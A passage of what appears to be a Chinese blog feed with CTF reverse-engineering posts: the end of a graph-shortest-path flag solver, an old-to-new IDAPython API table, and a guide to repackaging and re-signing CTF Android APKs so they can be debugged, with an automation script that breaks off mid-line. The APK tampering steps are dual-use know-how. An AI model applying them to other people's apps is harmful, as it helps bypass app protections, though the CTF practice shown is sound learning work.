dec_src = dec(value, keys[i])</span><br><span class="line">        nodes = get_node_edges(dec_src)</span><br><span class="line">        <span class="comment"># 添加边</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):<span class="comment"># 根据获取的指向的节点来添加边</span></span><br><span class="line">            edges.append([i, nodes[j]])</span><br><span class="line">    node2node.append(nodes)</span><br><span class="line"></span><br><span class="line">src_node = -<span class="number">1</span><span class="comment"># 最开始还有1个节点</span></span><br><span class="line">src_edge = [<span class="number">287</span>, <span class="number">96</span>, <span class="number">8</span>, <span class="number">777</span>, <span class="number">496</span>, <span class="number">822</span>, <span class="number">914</span>, <span class="number">550</span>, <span class="number">273</span>, <span class="number">259</span>, <span class="number">334</span>, <span class="number">966</span>, <span class="number">331</span>, <span class="number">680</span>, <span class="number">374</span>, <span class="number">717</span>, <span class="number">965</span>, <span class="number">952</span>, <span class="number">222</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将最初的边添加进去</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> src_edge:</span><br><span class="line">    edges.append([src_node, i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">G = networkx.DiGraph()</span><br><span class="line">G.add_node(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encs)):</span><br><span class="line">    G.add_node(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> edges:</span><br><span class="line">    G.add_edge(i[<span class="number">0</span>], i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">path = networkx.shortest_path(G, source=src_node, target=target_node)</span><br><span class="line"><span class="built_in">print</span>(path) <span class="comment"># 打印出路径来</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">s.append(src_edge.index(path[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(path)):</span><br><span class="line">    s.append(node2node[path[i-<span class="number">1</span>]].index(path[i]))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + i) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;L3HCTF&#123;&quot;</span> + hashlib.md5(s.encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [-1, 331, 578, 255, 875, 765, 687, 209, 119, 963, 939, 443, 250, 366, 65, 504, 920, 849, 720, 893, 728, 580, 114, 665, 72, 51, 241, 519, 473, 970, 984, 557, 90, 793, 487, 67, 428, 236, 263, 24, 39, 104, 505, 491, 95, 223, 486, 798, 873, 872, 64, 229, 37, 274, 329, 601, 372, 750, 446, 3, 332, 698, 277, 740, 816, 845, 570, 828, 21, 36, 839, 770, 343, 451, 151, 994, 937, 760, 644, 9, 614, 302, 454, 153, 840, 76, 424, 352, 950, 238, 613, 497, 898, 858, 415, 205, 393, 927, 522, 705, 426]</span></span><br><span class="line"><span class="comment"># [12, 2, 0, 4, 1, 0, 2, 4, 3, 0, 0, 1, 5, 0, 2, 0, 2, 0, 1, 6, 0, 6, 1, 1, 0, 0, 4, 0, 2, 0, 1, 2, 1, 0, 2, 4, 1, 0, 6, 0, 0, 0, 1, 2, 3, 1, 6, 1, 3, 1, 2, 1, 3, 0, 2, 6, 0, 1, </span></span><br><span class="line"><span class="comment"># 5, 1, 1, 4, 1, 0, 1, 0, 1, 1, 1, 1, 1, 2, 0, 0, 1, 3, 0, 1, 0, 1, 0, 5, 0, 2, 2, 0, 2, 3, 0, 6, 3, 0, 0, 1, 0, 1, 0, 0, 0, 0]</span></span><br><span class="line"><span class="comment"># mcaebacedaabfacacabgagbbaaeacabcbacebagaaabcdbgbdbcbdacgabfbbebababbbbbcaabdababafaccacdagdaababaaaa</span></span><br><span class="line"><span class="comment"># L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125;</span></span><br></pre></td></tr></table></figure><p>flag为 <code>L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125;</code></p><blockquote><p>参考： <a href="https://www.anquanke.com/post/id/259494#h3-2">https://www.anquanke.com/post/id/259494#h3-2</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图 </tag>
            
            <tag> 最短路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDAPython 学习笔记</title>
      <link href="/2021/12/08/LearnIDAPython/"/>
      <url>/2021/12/08/LearnIDAPython/</url>
      
        <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>比着大佬写的文章系统的学习下IDAPython，做下笔记，供自己以后查询</p><blockquote><p>大佬的文章，👇</p><p><a href="https://www.cnblogs.com/iBinary/p/14642662.html">https://www.cnblogs.com/iBinary/p/14642662.html</a><br><a href="https://www.cnblogs.com/iBinary/p/14672540.html">https://www.cnblogs.com/iBinary/p/14672540.html</a><br><a href="https://www.cnblogs.com/iBinary/p/14801928.html">https://www.cnblogs.com/iBinary/p/14801928.html</a></p></blockquote><h1 id="IDAPython参考学习文档"><a href="#IDAPython参考学习文档" class="headerlink" title="IDAPython参考学习文档"></a>IDAPython参考学习文档</h1><ul><li><p>IDAPython官方函数文档： <a href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/">https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/</a></p></li><li><p>IDA版本变化后IDAPython对应差异函数查询：<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml</a></p></li></ul><h1 id="IDA中获取界面中地址函数"><a href="#IDA中获取界面中地址函数" class="headerlink" title="IDA中获取界面中地址函数"></a>IDA中获取界面中地址函数</h1><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取当前指令地址（光标点击的那个，灰色阴影那行）</td><td align="center">idc.ScreenEA()</td><td align="center">idc.get_screen_ea()</td></tr><tr><td align="center">整个IDA中的最小地址</td><td align="center">idc.MinEA() idc.StartEA() idc.BeginEA()</td><td align="center">ida_ida.inf_get_min_ea()</td></tr><tr><td align="center">整个IDA中的最大地址（其实是最大地址 + 1）</td><td align="center">idc.MaxEA()</td><td align="center">ida_ida.inf_get_max_ea()</td></tr><tr><td align="center">光标选择块的开始地址</td><td align="center">idc.SelStart()</td><td align="center">idc.read_selection_start()</td></tr><tr><td align="center">光标选择块的结束地址（结束地址 + 1）</td><td align="center">idc.SelEnd()</td><td align="center">idc.read_selection_end()</td></tr></tbody></table><p><img src="./image-20211208195126744.png" alt="image-20211208195126744"></p><h1 id="数值获取及打补丁操作"><a href="#数值获取及打补丁操作" class="headerlink" title="数值获取及打补丁操作"></a>数值获取及打补丁操作</h1><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>在IDA中想要获取某个地址处的数据可以采用以下函数</p><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取BYTES类型</td><td align="center">ida_bytes.get_many_bytes(addr, len)</td><td align="center">ida_bytes.get_bytes(addr, len)</td></tr><tr><td align="center">获取BYTE类型</td><td align="center">idc.Byte(addr)</td><td align="center">idc.get_wide_byte(addr)</td></tr><tr><td align="center">获取WORD类型</td><td align="center">idc.Word(addr)</td><td align="center">idc.get_wide_word(addr)</td></tr><tr><td align="center">获取DWORD类型</td><td align="center">idc.Dword(addr)</td><td align="center">idc.get_wide_dword(addr)</td></tr><tr><td align="center">获取QWORD类型</td><td align="center">idc.Qword(addr)</td><td align="center">idc.get_qword(addr)</td></tr></tbody></table><h2 id="Patch打补丁"><a href="#Patch打补丁" class="headerlink" title="Patch打补丁"></a>Patch打补丁</h2><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">打补丁BYTE</td><td align="center">idc.PatchByte(addr,value)</td><td align="center">ida_bytes.patch_byte(addr,value)</td></tr><tr><td align="center">打补丁WORD</td><td align="center">idc.PatchWord(addr,value)</td><td align="center">ida_bytes.patch_word(addr,value)</td></tr><tr><td align="center">打补丁DWORD</td><td align="center">idc.PatchDword(addr,value)</td><td align="center">ida_bytes.patch_dword(addr,value)</td></tr><tr><td align="center">打补丁QWORD</td><td align="center">idc.PatchQword(addr,value)</td><td align="center">ida_bytes.patch_qword(addr,value)</td></tr></tbody></table><h1 id="汇编相关指令操作"><a href="#汇编相关指令操作" class="headerlink" title="汇编相关指令操作"></a>汇编相关指令操作</h1><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取地址处的汇编语句</td><td align="center">idc.GetDisasm(addr)</td><td align="center">无</td></tr><tr><td align="center">更高级的获取.带有标志. 一般是给一个0</td><td align="center">idc.GetDisasmEx(addr,flags)</td><td align="center">idc.generate_disasm_line(addr,flags)</td></tr><tr><td align="center">获取指定位置的操作数mov ebp, esp.        ebp索引是0，esp索引是1</td><td align="center">idc.GetOpnd(addr,index)</td><td align="center">idc.print_operand(addr,index)</td></tr><tr><td align="center">获取地址处汇编指令的操作指令 mov ebp,esp 获取mov</td><td align="center">idc.GetMnem(addr)</td><td align="center">idc.print_insn_mnem(addr)</td></tr><tr><td align="center">获取基地址</td><td align="center">idaapi.get_imagebase()</td><td align="center">无</td></tr><tr><td align="center">获取操作数的类型</td><td align="center">idc.GetOpType(ea,index)</td><td align="center">idc.get_operand_type(addr,index)</td></tr><tr><td align="center">call    printf； 调用此函数，index填0的话，返回的就是printf的地址。                   and   esp, 0FFFFFFF8h；index填1的话，返回的就是0xfffffff8</td><td align="center">idc.GetOperandValue(addr,index)</td><td align="center">get_operand_value(addr,index)</td></tr><tr><td align="center">获取下一行汇编的地址</td><td align="center">idc.NextHead</td><td align="center">idc.next_head(ea)</td></tr><tr><td align="center">获取上一行汇编的地址</td><td align="center">idc.PrevHead</td><td align="center">idc.PrevHead(ea)</td></tr></tbody></table><p><img src="./image-20211208203329972.png" alt="image-20211208203329972"></p><h1 id="段相关操作"><a href="#段相关操作" class="headerlink" title="段相关操作"></a>段相关操作</h1><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取段的名字</td><td align="center">idc.SegName(addr)</td><td align="center">idc.get_segm_name(addr)</td></tr><tr><td align="center">获取段的开始地址</td><td align="center">idc.SegStart(addr)</td><td align="center">idc.get_segm_start(addr)</td></tr><tr><td align="center">获取段的结束地址</td><td align="center">idc.SegEnd(addr)</td><td align="center">idc.get_segm_end(addr)</td></tr><tr><td align="center">返回一个列表记录所有段的地址</td><td align="center">idautils.Segments()</td><td align="center">无</td></tr><tr><td align="center">获取第一个段</td><td align="center">idc.FirstSeg()</td><td align="center">idc.get_first_seg()</td></tr><tr><td align="center">获取下一个段 参数是当前段的任意地址 返回的是下一个段的地址</td><td align="center">idc.NextSeg(addr)</td><td align="center">idc.get_next_seg(addr)</td></tr></tbody></table><p><img src="./image-20211208204731476.png" alt="image-20211208204731476"></p><h1 id="函数相关操作"><a href="#函数相关操作" class="headerlink" title="函数相关操作"></a>函数相关操作</h1><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取指定地址之间的所有函数</td><td align="center">Functions(startaddr,endaddr)</td><td align="center">无</td></tr><tr><td align="center">获取指定地址的函数名</td><td align="center">idc.GetFunctionName(addr)</td><td align="center">idc.get_func_name(addr)</td></tr><tr><td align="center">获取函数的注释</td><td align="center">idc.GetFunctionCmt</td><td align="center">get_func_cmt(ea, repeatable) 1是地址 2是0或1 1是获取重复注释 0是获取常规注释</td></tr><tr><td align="center">设置函数注释</td><td align="center">idc.SetFunctionCmt</td><td align="center">set_func_cmt(ea, cmt, repeatable)</td></tr><tr><td align="center">弹框让用户选择函数，返回的是函数的地址</td><td align="center">idc.ChooseFunction(title)</td><td align="center">idc.choose_func(title)</td></tr><tr><td align="center">返回: addr 距离函数的偏移形式</td><td align="center">idc.GetFuncOffset(addr)</td><td align="center">idc.get_func_off_str(addr)</td></tr><tr><td align="center">寻找函数结尾,如果函数存在则返回结尾地址,否则返回-1</td><td align="center">idc.FindFuncEnd(addr)</td><td align="center">idc.find_func_end(addr)</td></tr><tr><td align="center">设置函数结尾</td><td align="center">ida_funcs.func_setstart(addr,newstartaddr)</td><td align="center">ida_funcs.set_func_start(addr, newstart)</td></tr><tr><td align="center">设置函数开头</td><td align="center">ida_funcs.func_setstart(addr,newstartaddr)</td><td align="center">ida_funcs.set_func_start(addr, newstart)</td></tr><tr><td align="center">设置地址处的名字</td><td align="center">idc.MakeName(addr, name) 与之同名了还有Ex函数</td><td align="center">idc.set_name(ea, name, SN_CHECK) Ex函数也使用set_name</td></tr><tr><td align="center">获取前一个函数的地址</td><td align="center">idc.PrevFunction</td><td align="center">idc.get_prev_func(ea)</td></tr><tr><td align="center">获取下一个函数的地址</td><td align="center">idc.NextFunction</td><td align="center">idc.get_next_func</td></tr></tbody></table><p><img src="./image-20211208211856738.png" alt="image-20211208211856738"></p><p><img src="./image-20211208212151547.png" alt="image-20211208212151547"></p><h1 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h1><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">查找二进制找到返回地址没找到返回-1(BADADDR)</td><td align="center">idc.FindBinary</td><td align="center">idc.find_binary(ea, flag, searchstr, radix=16, from_bc695=False)</td></tr><tr><td align="center">返回data的地址，而不是code（注意不是指具体的数据，而是指的data类型）</td><td align="center">idc.FindData</td><td align="center">idc.find_data 或者ida_search.find_data</td></tr><tr><td align="center">返回code的地址，而不是data</td><td align="center">idc.FindCode</td><td align="center">idc.find_code 可以使用 ida_search.find_code 也可以使用</td></tr><tr><td align="center">跳转到ea位置</td><td align="center">idc.Jump</td><td align="center">ida_kernwin.jumpto(ea)</td></tr></tbody></table><h2 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h2><p>数据校验函数is_xxxx传入的都是flag，因为需要先获取某个地址处的flag，然后再将获取的flag传入is_xxxx</p><table><thead><tr><th align="center">作用</th><th align="center">老版函数</th><th align="center">新版函数</th></tr></thead><tbody><tr><td align="center">获取标志</td><td align="center">idc.GetFlags(ea)</td><td align="center">ida_bytes.get_full_flags(ea)</td></tr><tr><td align="center">判断是否是代码，传入标志，根据标志返回True or False</td><td align="center">idc.isCode(f)</td><td align="center">ida_bytes.is_code(f)</td></tr><tr><td align="center">同上 只不过是判断是否是数据</td><td align="center">idc.isData(f)</td><td align="center">ida_bytes.is_data(f)</td></tr></tbody></table><p><img src="./image-20211208215616799.png" alt="image-20211208215616799"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDAPython </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2道CTF_APK题不能调试的解决方法及引发的思考</title>
      <link href="/2021/12/04/%E5%AE%89%E5%8D%93%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95/"/>
      <url>/2021/12/04/%E5%AE%89%E5%8D%93%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="2道CTF-APK题不能调试的解决方法及引发的思考"><a href="#2道CTF-APK题不能调试的解决方法及引发的思考" class="headerlink" title="2道CTF_APK题不能调试的解决方法及引发的思考"></a>2道CTF_APK题不能调试的解决方法及引发的思考</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近找到2个安卓题目来练习，分析后发现如果可以调试的话会大大降低难度（一道是JEB调试，一道是IDA调试so文件），于是我用工具开始调试，发现都没有办法调试，经过各种查阅资料终于可以调试了，于是写下此文，记录下环境配置。</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/1nYwqxmipw_marYN6wKJjAg">https://pan.baidu.com/s/1nYwqxmipw_marYN6wKJjAg</a> </p><p>提取码：9rxq</p></blockquote><h2 id="题目-CTF-2-apk"><a href="#题目-CTF-2-apk" class="headerlink" title="题目:CTF_2.apk"></a>题目:CTF_2.apk</h2><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>JEB调试APK的时候, 先<code>adb shell</code>， 然后查看进程ID，为4546</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beyond1q:/ <span class="comment"># ps | grep &quot;ctf&quot;</span></span><br><span class="line">ps | grep <span class="string">&quot;ctf&quot;</span></span><br><span class="line">u0_a44    <span class="number">4546</span>  <span class="number">1876</span>  <span class="number">964728</span> <span class="number">83108</span>            d772dcc0 S com.example.ctf</span><br></pre></td></tr></table></figure><p>打开JEB附加</p><p><img src="./image-20211204190627939.png" alt="image-20211204190627939"></p><p><img src="./image-20211204190630889.png" alt="image-20211204190630889"></p><p>没法调试，下面开始解决</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>打开Manifest ，发现并没有<code>android:debuggable=&quot;true&quot;</code></p><p><img src="./image-20211204190828754.png" alt="image-20211204190828754"></p><p>先解包 <code>apktool.bat d CTF_2_.apk</code></p><p>于是用加上后用重新打包 <code>apktool.bat b CTF_2_</code>， 新生成的APK文件在 <code>CTF_2_\dist</code>中, 这个时候如果直接安装的话会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ZSKY\Desktop\新建文件夹\CTF_2\CTF_2_\dist</span><br><span class="line">λ adb install CTF_2_.apk</span><br><span class="line">4685 KB/s (3004999 bytes in 0.626s)</span><br><span class="line">Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl625528294.tmp/base.apk: Attempt to get length of null array]</span><br></pre></td></tr></table></figure><p>还需要签名才可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ZSKY\Desktop\新建文件夹\CTF_2                                                       </span><br><span class="line">λ keytool -genkey -keystore coolapk.keystore -keyalg RSA -validity 10000 -alias coolapk </span><br><span class="line">输入密钥库口令:       #123456                                                                           </span><br><span class="line">再次输入新口令:       #123456                                                                       </span><br><span class="line">您的名字与姓氏是什么?                                                                             </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">您的组织单位名称是什么?                                                                            </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">您的组织名称是什么?                                                                              </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">您所在的城市或区域名称是什么?                                                                         </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">您所在的省/市/自治区名称是什么?                                                                       </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">该单位的双字母国家/地区代码是什么?                                                                      </span><br><span class="line">  [Unknown]:                                                                            </span><br><span class="line">CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确?                </span><br><span class="line">  [否]:  y                                                                              </span><br></pre></td></tr></table></figure><blockquote><p>生成签名文件命令:    <code>keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名 </code></p></blockquote><p>这个时候会生成<code>coolapk.keystore</code>签名文件, 然后运行</p><p><code> jarsigner.exe -verbose -keystore coolapk.keystore -storepass 123456 -signedjar CTF_2_new_sign.apk -digestalg SHA1 -sigalg MD5withRSA CTF_2_new.apk coolapk</code> 即可签名</p><blockquote><p>给APK添加签名命令:    <code>jarsigner.exe -verbose -keystore coolapk.keystore -storepass 密码 -signedjar 新的APK文件名 -digestalg SHA1 -sigalg MD5withRSA 需要签名的APK文件名 签名文件的别名</code></p></blockquote><p>这个时候，把之前的安装好的APK删除，然后运行<code>adb install CTF_2_new_sign.apk</code>即可安装成功</p><p>再用JEB调试的时候，这里会多一个D标志</p><p><img src="./image-20211204193216603.png" alt="image-20211204193216603"></p><p>下断点输入FLAG，程序就会断下了</p><p><img src="./image-20211204193354623.png" alt="image-20211204193354623"></p><h2 id="题目-CTF-4-apk"><a href="#题目-CTF-4-apk" class="headerlink" title="题目:CTF_4.apk"></a>题目:CTF_4.apk</h2><h3 id="遇到问题-1"><a href="#遇到问题-1" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>IDA在 检测flag的函数那里下断点，手机输入flag后点注册按钮，IDA总是断不下来，然后下断点的话是橘黄色，后来查阅资料发现是基址的问题，这里<code>libnative-lib.so</code> 文件加载的基址居然是0</p><blockquote><p>IDA如何调试安卓so文件可以参考: <a href="https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/">https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/</a></p></blockquote><p><img src="./image-20211204210622565.png" alt="image-20211204210622565"></p><p><img src="./image-20211204210916986.png" alt="image-20211204210916986"></p><h3 id="解决问题-1"><a href="#解决问题-1" class="headerlink" title="解决问题"></a>解决问题</h3><p>1、尝试去找加载该so文件的基址然后手动修复</p><p><img src="./image-20211204211229149.png" alt="image-20211204211229149"></p><p>根本找不到该so文件。</p><p>2、用CTF_2那个方法把<code>android:debuggable=&quot;true&quot;</code>加上，然后重新打包签名，然后<code>adb install CTF_4.apk</code>的时候遇到了错误</p><p><img src="./image-20211204212033152.png" alt="image-20211204212033152"></p><p>经查阅，此错误是<code>android:extractNativeLibs=&quot;false&quot;</code>的缘故，改为<code>android:extractNativeLibs=&quot;true&quot;</code>即可，我们即加上<code>android:debuggable=&quot;true&quot;</code></p><p>也设置<code>android:extractNativeLibs=&quot;true&quot;</code>重新签名打包，发现可以调试</p><p><img src="./image-20211204212517297.png" alt="image-20211204212517297"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>在上一步解决问题之后，还是查看maps文件看基值，当点击注册按钮之后，发现可以发现加载了这个so文件，并且前面有基址，估计是<code>android:extractNativeLibs=&quot;true&quot;</code>的原因</p><p><img src="./image-20211204213228758.png" alt="image-20211204213228758"></p><p>我想测试，如果仅仅设置<code>android:extractNativeLibs=&quot;true&quot;</code> 而 <code>android:debuggable=&quot;false&quot;</code>不变的情况下，能不能通过手动的修复基址来达到IDA调试so的目的，开始测试，<code>android:extractNativeLibs=&quot;true&quot;</code> <code>android:debuggable=&quot;false&quot;</code> 重新打包签名，然后安装, 手机运行CTF_4， 然后查看maps文件有没有加载那个so文件</p><p><img src="./image-20211204214426436.png" alt="image-20211204214426436"></p><p>可以发现，果然加载了,然后准备调试，手机点击注册按钮，IDA弹出</p><p><img src="./image-20211204214939513.png" alt="image-20211204214939513"></p><p>点击same，然后在断点那里断下，不需要修复基址</p><p><img src="./image-20211204220029837.png" alt="image-20211204220029837"></p><p>所以，如果仅仅是IDA调试so的话，不需要JEB调试的话，根本不需要设置<code>android:debuggable=&quot;true&quot;</code>,但是必须得<code>android:extractNativeLibs=&quot;true&quot;</code></p><p>并且这里这个<code>android:extractNativeLibs</code> 如果设置为true或false，感觉有点像PE的那个静态库和动态库</p><h2 id="半自动脚本"><a href="#半自动脚本" class="headerlink" title="半自动脚本"></a>半自动脚本</h2><p>写了个半自动脚本，自动加debug属性，然后重新打包签名，环境为python3.8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、先解包APK</span></span><br><span class="line"><span class="comment"># 2、打开xml文件分析，android:debuggable 和 android:extractNativeLibs属性</span></span><br><span class="line"><span class="comment"># 3、如果没有android:debuggable,则可以加入并且设置为属性为 true</span></span><br><span class="line"><span class="comment"># 4、如果有android:debuggable， 则直接设置为true</span></span><br><span class="line"><span class="comment"># 5、如果没有android:extractNativeLibs 则不管，如果有且为false，则改为true</span></span><br><span class="line"><span class="comment"># 6、apktool重新打包</span></span><br><span class="line"><span class="comment"># 7、生成签名文件</span></span><br><span class="line"><span class="comment"># 8、将签名加入到apk中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_xml</span>():</span></span><br><span class="line">    <span class="comment"># 3,4,5 处理XML文件并写回</span></span><br><span class="line">    <span class="comment"># AndroidManifest.xml</span></span><br><span class="line">    dom = parse(<span class="string">&quot;AndroidManifest.xml&quot;</span>)</span><br><span class="line">    data = dom.documentElement</span><br><span class="line">    <span class="comment"># android:extractNativeLibs=&quot;true&quot;</span></span><br><span class="line">    <span class="comment"># android:debuggable=&quot;true&quot;</span></span><br><span class="line">    application = data.getElementsByTagName(<span class="string">&quot;application&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 正在修改 android:debuggable 属性&quot;</span>)</span><br><span class="line">    application[<span class="number">0</span>].setAttribute(<span class="string">&quot;android:debuggable&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> application[<span class="number">0</span>].getAttribute(<span class="string">&quot;android:extractNativeLibs&quot;</span>) == <span class="string">&#x27;false&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 正在修改android:extractNativeLibs 属性&quot;</span>)</span><br><span class="line">        application[<span class="number">0</span>].setAttribute(<span class="string">&quot;android:extractNativeLibs&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;AndroidManifest.xml&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    dom.writexml(f, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;AndroidManifest.xml&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        c = f.read()</span><br><span class="line">        c = c.replace(<span class="string">&#x27;encoding=&quot;utf-8&quot;&#x27;</span>, <span class="string">&#x27;encoding=&quot;utf-8&quot; standalone=&quot;no&quot;&#x27;</span>)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;AndroidManifest.xml&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span 